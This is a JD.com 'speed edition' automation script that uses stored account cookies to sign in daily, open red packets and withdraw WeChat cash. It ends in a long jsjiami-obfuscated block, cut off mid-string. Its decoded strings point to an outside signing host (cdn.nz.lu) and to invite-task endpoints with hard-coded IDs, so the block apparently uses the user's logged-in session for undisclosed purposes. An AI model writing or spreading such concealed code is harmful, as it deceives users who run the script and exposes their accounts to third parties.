/*
京东极速版签到红包
自动提现微信现金
15 5,19 * * * jd_speed_signred.js

*/
const $ = new Env('京东极速版红包');
const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let cookiesArr = [], cookie = '', message;
const linkIdArr = ["Eu7-E0CUzqYyhZJo9d3YkQ"];
const signLinkId = '9WA12jYGulArzWS7vcrwhw';
let linkId;
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
  if (JSON.stringify(process.env).indexOf('GITHUB') > -1) process.exit(0);
} else {
  cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
}
!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      console.log(`\n如提示活动火爆,可再执行一次尝试\n`);
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      message = '';
      await TotalBean();
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      for (let j = 0; j < linkIdArr.length; j++) {
        linkId = linkIdArr[j]
        await jsRedPacket()
      }
    }
  }
})()
  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })

async function jsRedPacket() {
  try {
    await getSigns();
    await sign();//极速版签到提现
    //await reward_query();
    //for (let i = 0; i < 3; i++) {
      //await redPacket();//开红包
      //await $.wait(2000)
    //}
    await getPacketList();//领红包提现
    await signPrizeDetailList();
    await showMsg()
  } catch (e) {
    $.logErr(e)
  }
}

function showMsg() {
  return new Promise(resolve => {
    if (message) $.msg($.name, '', `京东账号${$.index}${$.nickName}\n${message}`);
    resolve()
  })
}
async function sign() {
  return new Promise(async resolve => {
    const body = {"linkId":signLinkId,"serviceName":"dayDaySignGetRedEnvelopeSignService","business":1};
    const options = {
      url: `https://api.m.jd.com`,
      body: await getSign("apSignIn_day", body, true),
      headers: {
        "Host": "api.m.jd.com",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://daily-redpacket.jd.com",
        "Accept-Language": "zh-CN,zh-Hans;q=0.9",
        "User-Agent": $.isNode() ? (process.env.JS_USER_AGENT ? process.env.JS_USER_AGENT : (require('./JS_USER_AGENTS').USER_AGENT)) : ($.getdata('JSUA') ? $.getdata('JSUA') : "'jdltapp;iPad;3.1.0;14.4;network/wifi;Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
        "Referer": "https://daily-redpacket.jd.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Cookie": cookie
      }
    }
    $.post(options, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = $.toObj(data);
            if (data.code === 0) {
              if (data.data.retCode === 0) {
                message += `极速版签到提现：签到成功\n`;
                console.log(`极速版签到提现：签到成功\n`);
              } else {
                console.log(`极速版签到提现：签到失败:${data.data.retMessage}\n`);
              }
            } else {
              console.log(`极速版签到提现：签到异常:${JSON.stringify(data)}\n`);
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function reward_query() {
  return new Promise(resolve => {
    $.get(taskGetUrl("spring_reward_query", {
      linkId,
      "inviter": ["HXZ60he5XxG8XNUF2LSrZg"][Math.floor((Math.random() * 1))]
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0) {

            } else {
              console.log(data.errMsg)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
async function redPacket() {
  return new Promise(async resolve => {
    let body = {linkId, "inviter":["HXZ60he5XxG8XNUF2LSrZg"][Math.floor((Math.random() * 1))]}
    body = await getSign("spring_reward_receive", body, true)
    let options = {
      url: `https://api.m.jd.com/?${body}`,
      headers: {
        "Host": "api.m.jd.com",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://prodev.m.jd.com",
        "Accept-Encoding": "gzip, deflate, br",
        "User-Agent": $.isNode() ? (process.env.JS_USER_AGENT ? process.env.JS_USER_AGENT : (require('./JS_USER_AGENTS').USER_AGENT)) : ($.getdata('JSUA') ? $.getdata('JSUA') : "'jdltapp;iPad;3.1.0;14.4;network/wifi;Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
        "Accept-Language": "zh-CN,zh-Hans;q=0.9",
        "Referer": "https://prodev.m.jd.com/",
        "Cookie": cookie
      }
    }
    $.get(options, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0) {
              if (data.data.received.prizeType !== 1) {
                message += `获得${data.data.received.prizeDesc}\n`
                console.log(`获得${data.data.received.prizeDesc}`)
              } else {
                console.log("获得优惠券")
              }
            } else {
              console.log(data.errMsg)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

function getPacketList() {
  return new Promise(resolve => {
    $.get(taskGetUrl("spring_reward_list", {"pageNum":1,"pageSize":100,linkId,"inviter":""}), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0) {
              for (let item of data.data.items.filter(vo => vo.prizeType === 4)) {
                if (item.state === 0) {
                  console.log(`去提现${item.amount}微信现金`)
                  message += `提现${item.amount}微信现金，`
                  await cashOut(item.id, item.poolBaseId, item.prizeGroupId, item.prizeBaseId)
                }
              }
            } else {
              console.log(data.errMsg)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function signPrizeDetailList() {
  return new Promise(resolve => {
    const body = {"linkId":signLinkId,"serviceName":"dayDaySignGetRedEnvelopeSignService","business":1,"pageSize":20,"page":1};
    $.post(taskPostUrl("signPrizeDetailList", body), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = $.toObj(data);
            if (data.code === 0) {
              if (data.data.code === 0) {
                const list = (data.data.prizeDrawBaseVoPageBean.items || []).filter(vo => vo['prizeType'] === 4 && vo['prizeStatus'] === 0);
                for (let code of list) {
                  console.log(`极速版签到提现，去提现${code['prizeValue']}现金\n`);
                  message += `极速版签到提现，去提现${code['prizeValue']}微信现金，`
                  await apCashWithDraw(code['id'], code['poolBaseId'], code['prizeGroupId'], code['prizeBaseId']);
                }
              } else {
                console.log(`极速版签到查询奖品：失败:${JSON.stringify(data)}\n`);
              }
            } else {
              console.log(`极速版签到查询奖品：异常:${JSON.stringify(data)}\n`);
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function apCashWithDraw(id, poolBaseId, prizeGroupId, prizeBaseId) {
  return new Promise(resolve => {
    const body = {
      "linkId": signLinkId,
      "businessSource": "DAY_DAY_RED_PACKET_SIGN",
      "base": {
        "prizeType": 4,
        "business": "dayDayRedPacket",
        "id": id,
        "poolBaseId": poolBaseId,
        "prizeGroupId": prizeGroupId,
        "prizeBaseId": prizeBaseId
      }
    }
    $.post(taskPostUrl("apCashWithDraw", body), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = $.toObj(data);
            if (data.code === 0) {
              if (data.data.status === "310") {
                console.log(`极速版签到提现现金成功！`)
                message += `极速版签到提现现金成功！`;
              } else {
                console.log(`极速版签到提现现金：失败:${JSON.stringify(data)}\n`);
              }
            } else {
              console.log(`极速版签到提现现金：异常:${JSON.stringify(data)}\n`);
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function cashOut(id, poolBaseId, prizeGroupId, prizeBaseId) {
  let body = {
    "businessSource": "SPRING_FESTIVAL_RED_ENVELOPE",
    "base": {
      "id": id,
      "business": null,
      "poolBaseId": poolBaseId,
      "prizeGroupId": prizeGroupId,
      "prizeBaseId": prizeBaseId,
      "prizeType": 4
    },
    linkId,
    "inviter": ""
  }
  return new Promise(resolve => {
    $.post(taskPostUrl("apCashWithDraw", body), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            console.log(`提现零钱结果：${data}`)
            data = JSON.parse(data);
            if (data.code === 0) {
              if (data['data']['status'] === "310") {
                console.log(`提现成功！`)
                message += `提现成功！\n`;
              } else {
                console.log(`提现失败：${data['data']['message']}`);
                message += `提现失败：${data['data']['message']}`;
              }
            } else {
              console.log(`提现异常：${data['errMsg']}`);
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function taskPostUrl(function_id, body) {
  return {
    url: `https://api.m.jd.com/`,
    body: `functionId=${function_id}&body=${encodeURIComponent(JSON.stringify(body))}&t=${+new Date()}&appid=activities_platform&client=H5&clientVersion=1.0.0`,
    headers: {
      "Host": "api.m.jd.com",
      "Accept": "application/json, text/plain, */*",
      "Content-Type": "application/x-www-form-urlencoded",
      "Origin": "https://daily-redpacket.jd.com",
      "Accept-Language": "zh-CN,zh-Hans;q=0.9",
      "User-Agent": $.isNode() ? (process.env.JS_USER_AGENT ? process.env.JS_USER_AGENT : (require('./JS_USER_AGENTS').USER_AGENT)) : ($.getdata('JSUA') ? $.getdata('JSUA') : "'jdltapp;iPad;3.1.0;14.4;network/wifi;Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      "Referer": "https://daily-redpacket.jd.com/",
      "Accept-Encoding": "gzip, deflate, br",
      "Cookie": cookie
    }
  }
}
function taskGetUrl(function_id, body) {
  return {
    url: `https://api.m.jd.com/?functionId=${function_id}&body=${encodeURIComponent(JSON.stringify(body))}&t=${Date.now()}&appid=activities_platform`,
    headers: {
      "Host": "api.m.jd.com",
      "Accept": "application/json, text/plain, */*",
      "Origin": "https://prodev.m.jd.com",
      "Accept-Encoding": "gzip, deflate, br",
      "User-Agent": $.isNode() ? (process.env.JS_USER_AGENT ? process.env.JS_USER_AGENT : (require('./JS_USER_AGENTS').USER_AGENT)) : ($.getdata('JSUA') ? $.getdata('JSUA') : "'jdltapp;iPad;3.1.0;14.4;network/wifi;Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      "Accept-Language": "zh-CN,zh-Hans;q=0.9",
      "Referer": "https://prodev.m.jd.com/",
      "Cookie": cookie
    }
  }
}

function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      url: "https://me-api.jd.com/user_new/info/GetJDUserInfoUnion",
      headers: {
        Host: "me-api.jd.com",
        Accept: "*/*",
        Connection: "keep-alive",
        Cookie: cookie,
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
        "Accept-Language": "zh-cn",
        "Referer": "https://home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&",
        "Accept-Encoding": "gzip, deflate, br"
      }
    }
    $.get(options, (err, resp, data) => {
      try {
        if (err) {
          $.logErr(err)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === "1001") {
              $.isLogin = false; //cookie过期
              return;
            }
            if (data['retcode'] === "0" && data.data && data.data.hasOwnProperty("userInfo")) {
              $.nickName = data.data.userInfo.baseInfo.nickname;
            }
          } else {
            console.log('京东服务器返回空数据');
          }
        }
      } catch (e) {
        $.logErr(e)
      } finally {
        resolve();
      }
    })
  })
}

function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}

function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
var _0xodA='jsjiami.com.v6',_0xodA_=['‮_0xodA'],_0x209b=[_0xodA,'\x64\x48\x64\x6a\x61\x47\x38\x3d','\x5a\x55\x52\x4a\x53\x32\x67\x3d','\x64\x32\x78\x35\x61\x45\x49\x3d','\x59\x6b\x31\x57\x62\x45\x45\x3d','\x5a\x55\x52\x4b\x52\x47\x45\x3d','\x53\x6d\x52\x6c\x59\x31\x59\x3d','\x53\x6c\x4e\x4d\x55\x6d\x59\x3d','\x59\x58\x4e\x7a\x61\x57\x64\x75','\x55\x6c\x70\x33\x53\x46\x67\x3d','\x61\x30\x68\x73\x62\x6c\x4d\x3d','\x51\x6e\x42\x44\x63\x30\x34\x3d','\x61\x56\x46\x45\x56\x6e\x63\x3d','\x62\x33\x64\x52\x54\x46\x51\x3d','\x59\x31\x68\x42\x61\x31\x67\x3d','\x63\x48\x6c\x4e\x53\x6d\x30\x3d','\x59\x31\x68\x4c\x61\x46\x67\x3d','\x65\x46\x4a\x59\x56\x45\x45\x3d','\x61\x32\x56\x35\x63\x77\x3d\x3d','\x5a\x6d\x39\x79\x52\x57\x46\x6a\x61\x41\x3d\x3d','\x61\x46\x52\x4e\x53\x30\x45\x3d','\x56\x45\x46\x6c\x51\x55\x67\x3d','\x57\x55\x74\x45\x63\x6b\x49\x3d','\x5a\x6e\x5a\x48\x56\x33\x6f\x3d','\x5a\x30\x56\x45\x65\x56\x51\x3d','\x59\x55\x4a\x57\x62\x6b\x49\x3d','\x51\x55\x64\x4d\x56\x6d\x67\x3d','\x65\x45\x78\x35\x61\x6d\x34\x3d','\x61\x32\x52\x36\x54\x48\x6b\x3d','\x55\x55\x70\x46\x57\x58\x6f\x3d','\x62\x6b\x5a\x51\x51\x30\x55\x3d','\x53\x46\x5a\x47\x64\x33\x41\x3d','\x5a\x57\x68\x4d\x65\x57\x6f\x3d','\x5a\x47\x5a\x54\x53\x6d\x63\x3d','\x54\x6d\x64\x6e\x52\x46\x55\x3d','\x51\x6e\x4a\x46\x53\x58\x45\x3d','\x62\x58\x5a\x6f\x5a\x6c\x41\x3d','\x55\x6b\x52\x55\x61\x46\x49\x3d','\x63\x6c\x4a\x6b\x62\x58\x6b\x3d','\x52\x55\x56\x50\x55\x6e\x59\x3d','\x53\x33\x70\x44\x5a\x48\x63\x3d','\x53\x56\x52\x56\x54\x47\x55\x3d','\x64\x55\x70\x6f\x63\x57\x4d\x3d','\x5a\x33\x5a\x72\x63\x6b\x73\x3d','\x63\x6b\x78\x59\x5a\x32\x67\x3d','\x59\x6d\x39\x6b\x65\x51\x3d\x3d','\x57\x58\x5a\x72\x4c\x32\x5a\x4e\x56\x30\x70\x44\x4c\x7a\x5a\x73\x64\x6d\x4e\x34\x4d\x57\x6c\x56\x52\x6d\x35\x7a\x64\x7a\x30\x39','\x52\x54\x6c\x46\x64\x6c\x4e\x47\x54\x6e\x56\x42\x4d\x58\x42\x68\x61\x46\x4e\x52\x56\x44\x42\x31\x55\x33\x4e\x59\x61\x31\x63\x78\x64\x6a\x42\x71\x4b\x31\x46\x50\x53\x46\x46\x69\x61\x7a\x67\x72\x63\x47\x56\x4b\x57\x57\x4d\x77\x53\x54\x30\x3d','\x4e\x45\x46\x57\x55\x57\x46\x76\x4b\x32\x56\x49\x4f\x46\x45\x34\x61\x33\x5a\x74\x57\x47\x35\x58\x62\x57\x74\x48\x4f\x47\x56\x6d\x4c\x32\x5a\x4f\x63\x6a\x56\x6d\x5a\x47\x56\x71\x62\x6b\x51\x35\x4b\x7a\x6c\x56\x5a\x32\x4a\x6c\x59\x7a\x30\x3d','\x61\x6d\x4a\x48\x51\x6c\x4a\x43\x55\x47\x38\x31\x52\x47\x31\x33\x51\x6a\x6c\x75\x64\x46\x52\x44\x55\x31\x5a\x50\x52\x31\x68\x31\x61\x44\x46\x5a\x55\x58\x6c\x6a\x59\x30\x4e\x31\x57\x6e\x42\x58\x64\x32\x49\x7a\x55\x47\x78\x4a\x59\x7a\x30\x3d','\x62\x54\x6b\x31\x65\x53\x74\x51\x59\x57\x64\x7a\x62\x57\x34\x32\x59\x31\x68\x58\x64\x45\x35\x6f\x5a\x6e\x4a\x57\x4f\x58\x6c\x74\x52\x45\x34\x30\x55\x55\x73\x78\x61\x58\x5a\x7a\x62\x57\x4a\x4f\x4d\x7a\x4a\x73\x63\x45\x56\x49\x64\x7a\x30\x3d','\x52\x48\x56\x78\x54\x44\x55\x32\x4c\x7a\x4e\x6f\x4d\x54\x64\x57\x63\x47\x4a\x49\x53\x56\x63\x72\x64\x6a\x68\x31\x53\x6c\x4a\x53\x65\x56\x42\x4d\x4e\x6d\x73\x35\x52\x54\x46\x49\x64\x54\x56\x56\x61\x45\x4e\x35\x53\x48\x63\x76\x63\x7a\x30\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x68\x63\x47\x6b\x75\x62\x53\x35\x71\x5a\x43\x35\x6a\x62\x32\x30\x76','\x63\x47\x46\x79\x64\x47\x6c\x6a\x61\x58\x42\x68\x64\x47\x56\x4a\x62\x6e\x5a\x70\x64\x47\x56\x55\x59\x58\x4e\x72','\x59\x58\x42\x70\x4c\x6d\x30\x75\x61\x6d\x51\x75\x59\x32\x39\x74','\x59\x58\x42\x77\x62\x47\x6c\x6a\x59\x58\x52\x70\x62\x32\x34\x76\x61\x6e\x4e\x76\x62\x69\x77\x67\x64\x47\x56\x34\x64\x43\x39\x77\x62\x47\x46\x70\x62\x69\x77\x67\x4b\x69\x38\x71','\x59\x58\x42\x77\x62\x47\x6c\x6a\x59\x58\x52\x70\x62\x32\x34\x76\x65\x43\x31\x33\x64\x33\x63\x74\x5a\x6d\x39\x79\x62\x53\x31\x31\x63\x6d\x78\x6c\x62\x6d\x4e\x76\x5a\x47\x56\x6b','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x68\x63\x33\x4e\x70\x5a\x32\x35\x74\x5a\x57\x35\x30\x4c\x6d\x70\x6b\x4c\x6d\x4e\x76\x62\x51\x3d\x3d','\x65\x6d\x67\x74\x51\x30\x34\x73\x65\x6d\x67\x74\x53\x47\x46\x75\x63\x7a\x74\x78\x50\x54\x41\x75\x4f\x51\x3d\x3d','\x4c\x69\x39\x4b\x55\x31\x39\x56\x55\x30\x56\x53\x58\x30\x46\x48\x52\x55\x35\x55\x55\x77\x3d\x3d','\x53\x6c\x4e\x56\x51\x51\x3d\x3d','\x4a\x32\x70\x6b\x62\x48\x52\x68\x63\x48\x41\x37\x61\x56\x42\x68\x5a\x44\x73\x7a\x4c\x6a\x45\x75\x4d\x44\x73\x78\x4e\x43\x34\x30\x4f\x32\x35\x6c\x64\x48\x64\x76\x63\x6d\x73\x76\x64\x32\x6c\x6d\x61\x54\x74\x4e\x62\x33\x70\x70\x62\x47\x78\x68\x4c\x7a\x55\x75\x4d\x43\x41\x6f\x61\x56\x42\x68\x5a\x44\x73\x67\x51\x31\x42\x56\x49\x45\x39\x54\x49\x44\x45\x30\x58\x7a\x51\x67\x62\x47\x6c\x72\x5a\x53\x42\x4e\x59\x57\x4d\x67\x54\x31\x4d\x67\x57\x43\x6b\x67\x51\x58\x42\x77\x62\x47\x56\x58\x5a\x57\x4a\x4c\x61\x58\x51\x76\x4e\x6a\x41\x31\x4c\x6a\x45\x75\x4d\x54\x55\x67\x4b\x45\x74\x49\x56\x45\x31\x4d\x4c\x43\x42\x73\x61\x57\x74\x6c\x49\x45\x64\x6c\x59\x32\x74\x76\x4b\x53\x42\x4e\x62\x32\x4a\x70\x62\x47\x55\x76\x4d\x54\x56\x46\x4d\x54\x51\x34\x4f\x33\x4e\x31\x63\x48\x42\x76\x63\x6e\x52\x4b\x52\x46\x4e\x49\x56\x30\x73\x76\x4d\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x68\x63\x33\x4e\x70\x5a\x32\x35\x74\x5a\x57\x35\x30\x4c\x6d\x70\x6b\x4c\x6d\x4e\x76\x62\x53\x38\x3d','\x5a\x33\x70\x70\x63\x43\x77\x67\x5a\x47\x56\x6d\x62\x47\x46\x30\x5a\x53\x77\x67\x59\x6e\x49\x3d','\x54\x55\x5a\x50\x62\x57\x63\x3d','\x54\x6c\x4a\x4d\x57\x58\x41\x3d','\x54\x45\x78\x57\x5a\x47\x73\x3d','\x61\x6d\x52\x7a\x61\x57\x64\x75\x4c\x6d\x4e\x6d','\x53\x6e\x5a\x30\x62\x6b\x4d\x3d','\x54\x30\x31\x43\x61\x55\x30\x3d','\x59\x58\x42\x77\x62\x47\x6c\x6a\x59\x58\x52\x70\x62\x32\x34\x76\x61\x6e\x4e\x76\x62\x67\x3d\x3d','\x63\x57\x52\x34\x52\x33\x67\x3d','\x5a\x58\x42\x6a\x54\x6c\x6f\x3d','\x51\x6c\x70\x45\x51\x32\x77\x3d','\x65\x45\x46\x79\x62\x58\x4d\x3d','\x56\x56\x4e\x75\x55\x32\x77\x3d','\x52\x57\x46\x71\x51\x6d\x73\x3d','\x53\x6c\x56\x78\x59\x6b\x59\x3d','\x62\x55\x56\x55\x54\x6b\x4d\x3d','\x62\x47\x52\x70\x64\x6d\x6b\x3d','\x51\x6d\x68\x7a\x62\x6e\x41\x3d','\x51\x31\x64\x71\x54\x32\x51\x3d','\x53\x6d\x46\x4b\x53\x56\x51\x3d','\x61\x57\x70\x6b\x54\x45\x34\x3d','\x52\x6c\x42\x4b\x52\x33\x55\x3d','\x54\x6e\x6c\x4e\x51\x30\x34\x3d','\x51\x31\x46\x55\x62\x6b\x45\x3d','\x54\x58\x42\x52\x57\x55\x4d\x3d','\x65\x46\x52\x6c\x54\x48\x67\x3d','\x57\x58\x46\x77\x57\x6e\x6b\x3d','\x54\x6c\x6c\x4d\x62\x47\x45\x3d','\x62\x6e\x68\x6b\x54\x55\x59\x3d','\x54\x33\x5a\x68\x57\x55\x49\x3d','\x59\x57\x74\x30\x5a\x47\x6f\x3d','\x53\x45\x39\x4b\x53\x33\x45\x3d','\x64\x47\x64\x36\x5a\x48\x6f\x3d','\x54\x30\x4a\x59\x63\x31\x63\x3d','\x5a\x45\x5a\x61\x53\x45\x77\x3d','\x53\x32\x64\x47\x64\x45\x49\x3d','\x52\x30\x70\x6d\x54\x57\x45\x3d','\x52\x6e\x68\x72\x54\x58\x49\x3d','\x5a\x57\x35\x32','\x55\x30\x6c\x48\x54\x6c\x39\x56\x55\x6b\x77\x3d','\x63\x6c\x4a\x30\x56\x33\x4d\x3d','\x64\x6b\x74\x45\x64\x32\x49\x3d','\x5a\x6d\x78\x76\x62\x33\x49\x3d','\x63\x6d\x46\x75\x5a\x47\x39\x74','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x62\x48\x70\x33\x56\x56\x51\x3d','\x5a\x31\x5a\x74\x53\x6c\x51\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x75\x62\x6e\x6f\x75\x62\x48\x55\x76\x5a\x32\x56\x30\x61\x44\x56\x7a\x64\x41\x3d\x3d','\x63\x33\x52\x79\x61\x57\x35\x6e\x61\x57\x5a\x35','\x61\x57\x4a\x30\x56\x57\x51\x3d','\x52\x48\x46\x4f\x5a\x31\x63\x3d','\x63\x47\x39\x7a\x64\x41\x3d\x3d','\x52\x6b\x78\x59\x52\x6b\x49\x3d','\x62\x6d\x39\x59\x64\x47\x34\x3d','\x52\x6c\x46\x52\x55\x32\x67\x3d','\x52\x6d\x5a\x4b\x56\x6e\x67\x3d','\x63\x6d\x64\x4f\x54\x55\x67\x3d','\x53\x6b\x68\x69\x54\x55\x34\x3d','\x61\x6e\x42\x45\x59\x57\x49\x3d','\x64\x31\x46\x6b\x61\x6d\x34\x3d','\x62\x47\x74\x58\x53\x6c\x6b\x3d','\x61\x6d\x68\x69\x53\x31\x55\x3d','\x56\x45\x68\x79\x53\x58\x51\x3d','\x57\x6d\x52\x79\x62\x48\x6b\x3d','\x57\x6d\x64\x33\x52\x56\x55\x3d','\x63\x6b\x6c\x4b\x55\x56\x59\x3d','\x53\x6c\x5a\x4c\x64\x58\x41\x3d','\x62\x30\x68\x4b\x64\x6b\x67\x3d','\x55\x55\x52\x54\x54\x57\x59\x3d','\x54\x46\x52\x4a\x54\x30\x73\x3d','\x61\x6b\x78\x42\x61\x45\x51\x3d','\x53\x6c\x6c\x4f\x51\x55\x34\x3d','\x55\x30\x74\x31\x56\x55\x45\x3d','\x61\x58\x4a\x68\x64\x33\x63\x3d','\x51\x55\x56\x6f\x62\x31\x49\x3d','\x62\x56\x70\x48\x5a\x33\x4d\x3d','\x59\x58\x42\x77\x62\x48\x6b\x3d','\x57\x48\x42\x5a\x61\x46\x59\x3d','\x57\x45\x68\x76\x64\x6e\x6b\x3d','\x61\x33\x52\x70\x54\x46\x55\x3d','\x62\x47\x39\x6e\x52\x58\x4a\x79','\x5a\x47\x56\x74\x5a\x32\x45\x3d','\x52\x31\x52\x57\x62\x33\x49\x3d','\x57\x46\x52\x42\x56\x57\x30\x3d','\x56\x45\x64\x6c\x51\x6e\x6f\x3d','\x51\x57\x4a\x30\x52\x30\x6f\x3d','\x5a\x58\x6c\x32\x53\x45\x45\x3d','\x52\x55\x46\x46\x53\x30\x63\x3d','\x53\x33\x68\x72\x63\x46\x55\x3d','\x59\x6b\x5a\x56\x52\x45\x67\x3d','\x63\x6d\x5a\x4a\x56\x32\x30\x3d','\x63\x56\x6c\x46\x52\x45\x73\x3d','\x52\x47\x5a\x47\x63\x30\x34\x3d','\x5a\x6e\x56\x75\x59\x33\x52\x70\x62\x32\x35\x4a\x5a\x44\x31\x55\x59\x58\x4e\x72\x53\x57\x35\x32\x61\x58\x52\x6c\x55\x32\x56\x79\x64\x6d\x6c\x6a\x5a\x53\x5a\x69\x62\x32\x52\x35\x50\x51\x3d\x3d','\x5a\x55\x74\x6d\x56\x6c\x4d\x3d','\x61\x30\x31\x6c\x61\x57\x38\x3d','\x4a\x6d\x46\x77\x63\x47\x6c\x6b\x50\x57\x31\x68\x63\x6d\x74\x6c\x64\x43\x31\x30\x59\x58\x4e\x72\x4c\x57\x67\x31\x4a\x6e\x56\x31\x61\x57\x51\x39\x4a\x6c\x39\x30\x50\x51\x3d\x3d','\x62\x6d\x39\x33','\x64\x46\x42\x75\x54\x6d\x59\x3d','\x57\x57\x52\x78\x53\x55\x55\x3d','\x52\x57\x31\x6a\x56\x6d\x63\x3d','\x62\x58\x56\x52\x63\x55\x63\x3d','\x63\x32\x39\x36\x64\x55\x38\x3d','\x61\x58\x4e\x4f\x62\x32\x52\x6c','\x53\x6c\x4e\x66\x56\x56\x4e\x46\x55\x6c\x39\x42\x52\x30\x56\x4f\x56\x41\x3d\x3d','\x57\x55\x6c\x49\x54\x6d\x38\x3d','\x64\x33\x42\x5a\x62\x6b\x51\x3d','\x56\x56\x4e\x46\x55\x6c\x39\x42\x52\x30\x56\x4f\x56\x41\x3d\x3d','\x5a\x32\x56\x30\x5a\x47\x46\x30\x59\x51\x3d\x3d','\x64\x6c\x42\x4d\x52\x55\x55\x3d','\x61\x32\x6c\x70\x63\x6e\x6f\x3d','\x57\x48\x56\x44\x51\x6d\x34\x3d','\x5a\x57\x74\x71\x57\x55\x49\x3d','\x4d\x44\x63\x79\x4e\x44\x51\x3d','\x59\x57\x4e\x30\x61\x58\x5a\x70\x64\x47\x6c\x6c\x63\x31\x39\x77\x62\x47\x46\x30\x5a\x6d\x39\x79\x62\x51\x3d\x3d','\x59\x5